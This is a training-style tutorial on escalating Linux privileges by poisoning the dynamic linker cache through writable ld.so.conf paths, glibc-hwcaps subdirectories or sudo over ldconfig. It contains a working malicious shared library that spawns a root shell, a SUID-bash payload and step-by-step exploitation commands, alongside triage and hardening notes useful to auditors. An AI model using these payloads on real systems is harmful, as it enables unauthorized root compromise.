# ld.so privesc exploit example

{{#include ../../banners/hacktricks-training.md}}

This page is a focused lab for poisoning the **system linker cache through `/etc/ld.so.conf` or `ldconfig`**. For missing-library injection, writable `RPATH`/`RUNPATH`, `LD_PRELOAD`, and other generic SUID linker abuse, see [SUID Shared Library and Linker Abuse](suid-shared-library-and-linker-abuse.md).

## Prepare the environment

In the following section you can find the code of the files we are going to use to prepare the environment

{{#tabs}}
{{#tab name="sharedvuln.c"}}

```c
#include <stdio.h>
#include "libcustom.h"

int main(){
    printf("Welcome to my amazing application!\n");
    vuln_func();
    return 0;
}
```

{{#endtab}}

{{#tab name="libcustom.h"}}

```c
#include <stdio.h>

void vuln_func();
```

{{#endtab}}

{{#tab name="libcustom.c"}}

```c
#include <stdio.h>

void vuln_func()
{
    puts("Hi");
}
```

{{#endtab}}
{{#endtabs}}

1. **Create** those files in your machine in the same folder
2. **Compile** the **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Copy** `libcustom.so` to `/usr/lib` and refresh the cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
4. **Compile** the **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Check the environment

Check that _libcustom.so_ is being **loaded** from _/usr/lib_ and that you can **execute** the binary.

```
$ ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
	libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```

### Useful triage commands

When attacking a real target, verify the **exact library name** the binary needs, what the loader is **currently resolving**, and which configured paths are writable without mutating the live cache.<sup>[[1]](#references)[[2]](#references)[[5]](#references)</sup>

```bash
# Needed SONAME and program interpreter
readelf -d ./sharedvuln | grep NEEDED
interp=$(readelf -l ./sharedvuln | sed -n 's/.*interpreter: \(.*\)]/\1/p')

# Cached candidates and the path selected by the loader
ldconfig -p | grep -F libcustom
"$interp" --list ./sharedvuln 2>/dev/null
LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'

# Configuration, writable config objects, and every component of a configured path
grep -RnsEv '^[[:space:]]*(#|$)' /etc/ld.so.conf /etc/ld.so.conf.d 2>/dev/null
find /etc/ld.so.conf /etc/ld.so.conf.d -writable -ls 2>/dev/null
namei -l /home/ubuntu/lib

# Enumerate what ldconfig would scan without changing links (-X) or the cache (-N)
/sbin/ldconfig -N -X -v 2>/dev/null
```

Use `ldd` only on a **trusted** executable. Some implementations or unusual ELF interpreters can cause it to execute attacker-controlled code; `objdump -p ./file | grep NEEDED` safely lists direct dependencies. For a trusted target, invoking the discovered interpreter with `--list` shows actual resolution.<sup>[[4]](#references)</sup>

A couple of useful gotchas:

- `sudo echo ... > /etc/ld.so.conf.d/x.conf` usually **doesn't work** because
  the redirection is done by your current shell. Use
  `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf` instead.
- **SUID/privileged** binaries run in **secure-execution mode**: `LD_LIBRARY_PATH`
  is ignored, while `LD_PRELOAD` is restricted (slash-containing names are
  ignored, and only setuid-marked libraries in standard directories may be
  preloaded). Once root runs `ldconfig`, directories listed in
  `/etc/ld.so.conf` can enter `/etc/ld.so.cache`, so this misconfiguration can
  still affect privileged programs.<sup>[[1]](#references)[[2]](#references)</sup>
- `LD_DEBUG` is also ignored in secure-execution mode unless `/etc/suid-debug` exists, so collect its trace from an equivalent non-SUID run rather than expecting output from the privileged execution.<sup>[[1]](#references)</sup>
- On glibc 2.33 and newer, the dynamic loader also exposes
  `--list-diagnostics`, which prints machine-readable loader diagnostics and
  built-in search-path information when a hijack doesn't behave as expected.<sup>[[1]](#references)[[6]](#references)</sup>

### Cache and SONAME constraints

`ldconfig` does not cache every arbitrary file in a configured directory: it examines ELF headers, recognizes names matching `lib*.so*` or `ld-*.so*`, and expects the conventional `libfoo.so -> libfoo.so.1 -> libfoo.so.1.12` chain. The injected object must therefore have the target architecture/class, the exact `DT_NEEDED` name (normally its `DT_SONAME`), and any symbols/versions the victim resolves.<sup>[[2]](#references)</sup>

```bash
readelf -h /home/ubuntu/lib/libcustom.so | grep -E 'Class:|Machine:'
readelf -d /home/ubuntu/lib/libcustom.so | grep SONAME
readelf -Ws /home/ubuntu/lib/libcustom.so | grep vuln_func
ldconfig -p | grep -F 'libcustom.so'
```

Prefer a target-specific library such as this example. Shadowing a common SONAME with an incomplete object can break every process that resolves it before the intended privileged target runs.<sup>[[3]](#references)</sup>

## Exploit

In this scenario, suppose an administrator has added a vulnerable entry to a
file under `/etc/ld.so.conf.d/` that is included by the system's
`/etc/ld.so.conf`.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
```

The vulnerable folder is _/home/ubuntu/lib_ (where we have writable access).\
**Download and compile** the following code inside that path:

```c
// gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(void){
    setgid(0);
    setuid(0);
    puts("I'm the bad library");
    system("/bin/sh");
}
```

If you expect **root** (or another privileged account) to execute the vulnerable binary later, it is usually better to leave a **root-owned artifact** instead of spawning an interactive shell. For example:

```c
system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
```

Then, after the privileged execution happens, you can use `/tmp/rootbash -p`.

Now that we have **created the malicious libcustom library inside the misconfigured** path, the default cache must be rebuilt by a successful privileged **`ldconfig`** run. A reboot helps only where the local boot process actually invokes it; otherwise wait for an administrator action or use an unsafe sudo rule if one is available.<sup>[[2]](#references)</sup>

Once this has happened **recheck** where the `sharedvuln` executable is loading the `libcustom.so` library from:

```c
$ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007ffeee766000)
	libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```

As you can see it's **loading it from `/home/ubuntu/lib`** and if any user executes it, a shell will be executed:

```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```

> [!TIP]
> Note that in this example we haven't escalated privileges, but modifying the commands executed and **waiting for root or other privileged user to execute the vulnerable binary** we will be able to escalate privileges.

### Modern `glibc-hwcaps` shadowing

Since glibc 2.33, the loader can prefer optimized libraries below `glibc-hwcaps/<level>/` inside **every library search directory**. Consequently, checking only `/home/ubuntu/lib` is insufficient: a writable compatible subdirectory such as `/home/ubuntu/lib/glibc-hwcaps/x86-64-v3/` can shadow the base library after `ldconfig` indexes it, while other CPUs keep using the base object. This also provides an architecture-selective hijack that can be missed when validation occurs on a different CPU.<sup>[[1]](#references)[[3]](#references)</sup>

```bash
# The loader prints the supported levels in priority order
"$interp" --help | sed -n '/Subdirectories of glibc-hwcaps/,$p'
find /home/ubuntu/lib/glibc-hwcaps -type d -writable -ls 2>/dev/null

# Example for a host that reports x86-64-v3 as supported
mkdir -p /home/ubuntu/lib/glibc-hwcaps/x86-64-v3
gcc -shared -fPIC -Wl,-soname,libcustom.so \
  -o /home/ubuntu/lib/glibc-hwcaps/x86-64-v3/libcustom.so libcustom.c
sudo ldconfig
ldconfig -p | grep -F libcustom.so
"$interp" --list ./sharedvuln | grep -F libcustom.so
```

The current glibc hardening guidance recommends avoiding duplicate SONAMEs, non-default search locations, and objects in `glibc-hwcaps` subdirectories. From an audit perspective, apply ownership and writeability checks recursively to configured directories and their parent path components.<sup>[[3]](#references)</sup>

### Other misconfigurations - Same vuln

In the previous example we faked a misconfiguration where an administrator **set a non-privileged folder inside a configuration file inside `/etc/ld.so.conf.d/`**.\
But there are other misconfigurations that can cause the same vulnerability: if you have **write permissions** in a loaded **config file**, can create a file in a writable `/etc/ld.so.conf.d/` directory, or can write to `/etc/ld.so.conf`, you can configure and exploit the same vulnerability.<sup>[[1]](#references)[[2]](#references)</sup>

## Exploit 2

**Suppose you have sudo privileges over `ldconfig`**.\
You can indicate `ldconfig` **which configuration file to read** with `-f`, so a file that names attacker-controlled directories can make `ldconfig` add those folders to the cache.<sup>[[2]](#references)</sup>\
So, lets create the files and folders needed to load "/tmp":

```bash
cd /tmp
mkdir -p conf
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```

Now, as indicated in the **previous exploit**, **create the malicious library inside `/tmp`**.\
And finally, lets load the path and check where is the binary loading the library from:

```bash
# -f changes the input configuration; the default output is still /etc/ld.so.cache
sudo ldconfig -f fake.ld.so.conf

ldd sharedvuln
	linux-vdso.so.1 =>  (0x00007fffa2dde000)
	libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
	/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```

**As you can see, having sudo privileges over `ldconfig` you can exploit the same vulnerability.** The option details matter when assessing a constrained sudo rule: `-f` selects another configuration but still rebuilds `/etc/ld.so.cache`; `-C` redirects the cache elsewhere; `-N` prevents cache rebuilding; and `-X` prevents link updates but **still rebuilds the cache unless combined with `-N`**.<sup>[[2]](#references)</sup>



## References

- [1] [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [2] [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
- [3] [Dynamic Linker Hardening - The GNU C Library](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Hardening.html)
- [4] [ldd(1) - Linux manual page](https://man7.org/linux/man-pages/man1/ldd.1.html)
- [5] [readelf (GNU Binary Utilities)](https://www.sourceware.org/binutils/docs/binutils/readelf.html)
- [6] [Dynamic Linker Diagnostics (The GNU C Library)](https://sourceware.org/glibc/manual/latest/html_node/Dynamic-Linker-Diagnostics.html)
{{#include ../../banners/hacktricks-training.md}}
